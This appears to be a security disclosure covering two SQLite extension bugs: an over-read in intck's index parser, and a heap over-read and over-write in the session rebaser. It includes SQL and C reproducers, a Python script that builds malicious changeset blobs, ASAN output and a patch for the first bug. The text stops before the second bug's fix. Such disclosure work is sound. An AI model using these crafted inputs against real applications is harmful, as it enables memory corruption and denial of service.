Summary
intckParseCreateIndex() (ext/intck/sqlite3intck.c:376) loops while( z[iOff]!='(' ){ iOff += intckGetToken(&z[iOff]); if( z[iOff]=='\0' ) return 0; }. For an empty string z=="", z[0]=='\0' is not '(' so the body runs; intckGetToken() sees the NUL, matches no quote/[/letter/space branch, falls through to the default iRet=1, so iOff becomes 1 and the z[iOff]=='\0' guard dereferences z[1], one byte past the end of the empty string, before the loop condition is rechecked (CWE-125).

Reproduce
No corrupt DB is needed. The .intck shell command calls sqlite3_intck_open(), which registers the UDF parse_create_index with nArg=2 (sqlite3intck.c:799); sqlite3_intck_close() then tries to unregister it with nArg=1 (sqlite3intck.c:819), a signature mismatch, so the 2-arg function survives and stays callable for the rest of the session. Passing it an empty string reaches the over-read. printf('%.0s','a') is used instead of a bare '' so the value is SQLite's zero-length global buffer (*.LC24), whose next byte is ASAN-poisoned.
CREATE TABLE t1(a, b);
CREATE INDEX i1 ON t1(a);
.intck 1
SELECT quote(parse_create_index(printf('%.0s','a'), 0));
==ERROR: AddressSanitizer: global-buffer-overflow ... READ of size 1
#0 intckParseCreateIndex  sqlite3intck.c:377 (reads z[1])
#1 intckParseCreateIndexFunc
0x... is located 0 bytes to the right of global variable '*.LC24' ... of size 1 (ascii string '')

Fix/* ext/intck/sqlite3intck.c intckParseCreateIndex(): test NUL before stepping. */
while( z[iOff]!='(' ){
if( z[iOff]=='\0' ) return 0;
iOff += intckGetToken(&z[iOff]);
}

Also fix sqlite3_intck_close() to unregister parse_create_index with the matching nArg=2 so the UDF does not outlive the intck handle.

Summary
sessionRebase() (ext/session/sqlite3session.c:7019) selects a rebaser change by table name (sqlite3_stricmp(pTab->zName, zTab)) plus PK equality, with no column-count compatibility check. When an input UPDATE is rebased against a matching change (call site 7074), sessionAppendPartialUpdate() (sqlite3session.c:6929) walks cursor a2 over the rebaser change's aRecord for pIter->nCol iterations with no end-of-record guard, so an input UPDATE declaring more columns than the rebaser table runs a2 past the SessionChange.aRecord heap block: sessionSerialLen(a2) (6948) OOB-reads the type byte and memcpy(pOut,a2,n2) (6955) copies an OOB-derived length (CWE-125/CWE-787). Commit c631da1fd4 added the a1Eof/a2Eof clamp to the sibling sessionAppendRecordMerge but never to sessionAppendPartialUpdate.

Reproduce
Attack vector is the documented session/rebaser C-API (sqlite3rebaser_configure + sqlite3rebaser_rebase), i.e. any host application that rebases untrusted changesets. The session extension is present in the sqlite3.c amalgamation but compiled out by default; it is enabled with -DSQLITE_ENABLE_SESSION -DSQLITE_ENABLE_PREUPDATE_HOOK. Three steps: generate the two malicious blobs, compile a small driver that only calls the public C-API, run it under ASAN.

Step 1 — generate the blobs (gen.py, pure Python, no SQLite linkage). Emits raw bytes per the documented changeset binary format ('T' varint(nCol) PK-flags zName\0, then op-byte, indirect-byte, cells; 0x00=undefined cell, 0x01=NULL, 0x02=int8be):
import struct
def varint(n):
if n==0: return b"\x00"
out=bytearray()
while n: out.insert(0,n&0x7f); n>>=7
for i in range(len(out)-1): out[i]|=0x80
return bytes(out)
def cell_int(v): return b"\x02"+struct.pack(">q",v)
def hdr(name,ncol,pk): return b"\x54"+varint(ncol)+bytes(pk)+name.encode()+b"\x00"

# rebaser: table t1, 1 col (PK), single INSERT PK=7
reb = hdr("t1",1,[1]) + b"\x12\x00" + cell_int(7)
# input: table t1, 40 cols (col0 PK), single UPDATE PK==7
ncol=40; pk=[1]+[0]*(ncol-1)
old = cell_int(7) + b"\x00"*(ncol-1)                         # UPDATE old: PK=7, rest undefined
new = b"\x00" + cell_int(0x4141414141414141-(1<<63))*(ncol-1) # UPDATE new: PK undefined, rest set
inp = hdr("t1",ncol,pk) + b"\x17\x00" + old + new
open("rebaser.bin","wb").write(reb)   # 17 bytes
open("input.bin","wb").write(inp)     # 447 bytes

Step 2 — driver (harness.c) calls only the public rebaser API:
#include <stdio.h>
#include <stdlib.h>
#include "sqlite3.h"
static void *slurp(const char *p,int *n){ FILE *f=fopen(p,"rb"); fseek(f,0,SEEK_END);
long m=ftell(f); fseek(f,0,SEEK_SET); void *b=malloc(m); fread(b,1,m,f); fclose(f); *n=(int)m; return b; }
int main(void){
int nReb,nIn; void *reb=slurp("rebaser.bin",&nReb), *in=slurp("input.bin",&nIn);
sqlite3_rebaser *pReb=0;
sqlite3rebaser_create(&pReb);
sqlite3rebaser_configure(pReb, nReb, reb);          /* loads rebaser table t1, nCol=1 */
int nOut=0; void *pOut=0;
sqlite3rebaser_rebase(pReb, nIn, in, &nOut, &pOut); /* input UPDATE nCol=40 -> a2 OOB here */
sqlite3_free(pOut); sqlite3rebaser_delete(pReb); return 0;
